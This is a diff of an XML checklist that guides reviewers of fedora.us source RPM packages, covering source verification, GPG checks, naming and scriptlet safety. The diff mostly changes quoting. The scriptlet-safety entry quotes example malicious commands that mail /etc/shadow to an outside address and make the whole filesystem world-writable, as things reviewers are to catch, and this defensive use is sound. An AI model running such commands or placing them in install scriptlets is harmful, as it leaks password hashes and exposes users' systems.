@@ -1,4 +1,4 @@
-<?xml version='1.0' ?>
+<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE checklist PUBLIC "-//BadgerWare//DTD QA Assistant Checklist File 0.3//EN" "http://qa-assistant.sf.net/dtds/checklist/0.3/checklist.dtd">
 <checklist version="0.3" name="Fedora.us SRPM QA" revision="0.3">
   <summary>Run QA on SRPMS according to the fedora.us rules</summary>
@@ -25,7 +25,7 @@
       </require>
     </property>
   </properties>
-  <functions hash='@@hash@@' hashtype='nullhash'>fedoraus.py</functions>
+  <functions hash="4720b8010dfc319fffc583e28497ec5c404916b4" hashtype="nullhash">fedoraus.py</functions>
   <category name="Security of the build system">
     <description>Although many of the checklist items relate to security, the
       ones listed in this section are important to check before you proceed
@@ -60,10 +60,10 @@
         good or poor packaging habits to think about when reviewing their
         packages.</description>
     </entry>
-    <entry name='Canonical Source' display='true'>
+    <entry name="Canonical Source" display="true">
       <states>
-        <state name='Pass'>Source URL is canonical</state>
-        <state name='Fail'>Specified Source URL is not canonical</state>
+        <state name="Pass">Source URL is canonical</state>
+        <state name="Fail">Specified Source URL is not canonical</state>
       </states>
       <description>You should check to be sure the Source and URL fields
         point to canonical sources for the software project.  This helps
@@ -71,10 +71,10 @@
         source tarball from an unknown entity.  Using google to search for
         canonical home pages is one good way to verify this.</description>
     </entry>
-    <entry name='Upstream source verified' display='true'>
+    <entry name="Upstream source verified" display="true">
       <states>
-        <state name='Pass'>Upstream source tarball verified</state>
-        <state name='Fail'>Upstream source tarball does not match!</state>
+        <state name="Pass">Upstream source tarball verified</state>
+        <state name="Fail">Upstream source tarball does not match!</state>
       </states>
       <description>You should always verify that the upstream source matches
         the source provided in the SRPM.  One technique is to download
@@ -89,9 +89,9 @@
     </entry>
     <entry name="Install time scriptlet safety">
       <states>
-        <state name='Pass'>Install time scriptlets do not have obvious malicious code.</state>
-        <state name='Fail'>Install time scriplet does unsafe things. [REVIEWER please add details]</state>
-        <state name='Not-Applicable'>There are no install time scriptlets</state>
+        <state name="Pass">Install time scriptlets do not have obvious malicious code.</state>
+        <state name="Fail">Install time scriplet does unsafe things. [REVIEWER please add details]</state>
+        <state name="Not-Applicable">There are no install time scriptlets</state>
       </states>
       <description>The install time scriplets in the %pre, %post, %preun, and
         %postun are arbitrary shell scripts that are executed when the RPM
@@ -103,11 +103,11 @@
         'mail cracker@domain.com &lt; /etc/shadow', 'chmod -R a+rwX /'
       </description>
     </entry>
-    <entry name='Upstream GPG Checked'>
+    <entry name="Upstream GPG Checked">
       <states>
-        <state name='Pass'>Good upstream GPG Signature</state>
-        <state name='Fail'>Upstream GPG Signatures do not match</state>
-        <state name='Not-Applicable'>No upstream GPG Signature</state>
+        <state name="Pass">Good upstream GPG Signature</state>
+        <state name="Fail">Upstream GPG Signatures do not match</state>
+        <state name="Not-Applicable">No upstream GPG Signature</state>
       </states>
       <description>Whenever possible, you should check that the upstream tarball is
         truly from a trusted source.  One method of doing this is to have the
@@ -126,8 +126,8 @@
       author may be trying to execute.</description>
     <entry name="Package Naming">
       <states>
-        <state name='Pass'>Package name conforms to the Fedora Naming Guidelines</state>
-        <state name='Fail'>Package needs to be renamed to meet the Fedora Naming Guidelines</state>
+        <state name="Pass">Package name conforms to the Fedora Naming Guidelines</state>
+        <state name="Fail">Package needs to be renamed to meet the Fedora Naming Guidelines</state>
       </states>
       <description>The Fedora Package Naming Guidelines specify a way to
         name packages that is easy to understand, allows smooth upgrading
@@ -138,10 +138,10 @@
     </entry>
     <entry name="Install time scriptlet bugs">
       <states>
-        <state name='Pass'>No bugs found in install time scriptlets</state>
-        <state name='Fail'>Install time scriptlet bug! [REVIEWER: Please add details]</state>
-        <state name='Non-Blocker'>Minor scriptlet bug [REVIEWER: Please add details]</state>
-        <state name='Not-Applicable'>There are no install time scriptlets</state>
+        <state name="Pass">No bugs found in install time scriptlets</state>
+        <state name="Fail">Install time scriptlet bug! [REVIEWER: Please add details]</state>
+        <state name="Non-Blocker">Minor scriptlet bug [REVIEWER: Please add details]</state>
+        <state name="Not-Applicable">There are no install time scriptlets</state>
       </states>
       <description>%pre, %preun, %post, and %postun scripts are necessary to
         perform necessary prep work on a computer before software is installed
@@ -157,7 +157,7 @@
         things to watch out for.
       </description>
     </entry>
-    <entry name='Epoch'>
+    <entry name="Epoch">
       <states>
         <state name="Pass">Versioned dependencies use epoch properly</state>
         <state name="Fail">Versioned dependency used without proper epoch</state>
@@ -187,9 +187,9 @@
     </entry>
     <entry name="BuildRoot">
       <states>
-        <state name='Pass'>Buildroot has all required elements</state>
-        <state name='Fail'>Buildroot lacks certain elements</state>
-        <state name='Non-Blocker'>Buildroot lacks certain elements</state>
+        <state name="Pass">Buildroot has all required elements</state>
+        <state name="Fail">Buildroot lacks certain elements</state>
+        <state name="Non-Blocker">Buildroot lacks certain elements</state>
       </states>
       <description>The spec file must have a  BuildRoot: field.  This must
         contain %{_tmppath} as a prefix so the local user can define where
@@ -279,8 +279,8 @@
       get the package to build, install, and run.</description>
     <entry name="Mandatory BuildRequires">
       <states>
-        <state name='Pass'>All necessary BuildRequires listed.</state>
-        <state name='Fail'>Package needs additional BuildRequires: [REVIEWER: Please list]</state>
+        <state name="Pass">All necessary BuildRequires listed.</state>
+        <state name="Fail">Package needs additional BuildRequires: [REVIEWER: Please list]</state>
       </states>
       <description>Building a package requires tools (such as a compiler for
         the programming language) and libraries in order to be created. These
@@ -303,10 +303,10 @@
     </entry>
     <entry name="Features and BuildRequires">
       <states>
-        <state name='Pass'>All desired features are enabled</state>
-        <state name='Fail'>Desirable features need extra BuildRequires: [REVIEWER: Please list]</state>
-        <state name='Non-Blocker'>Some minor features were left out of this build: [REVIEWER please list]</state>
-        <state name='Not-Applicable'>No optional features</state>
+        <state name="Pass">All desired features are enabled</state>
+        <state name="Fail">Desirable features need extra BuildRequires: [REVIEWER: Please list]</state>
+        <state name="Non-Blocker">Some minor features were left out of this build: [REVIEWER please list]</state>
+        <state name="Not-Applicable">No optional features</state>
       </states>
       <description>Sometimes a package can have desirable optional
         features built in but they need to be specifically asked for during
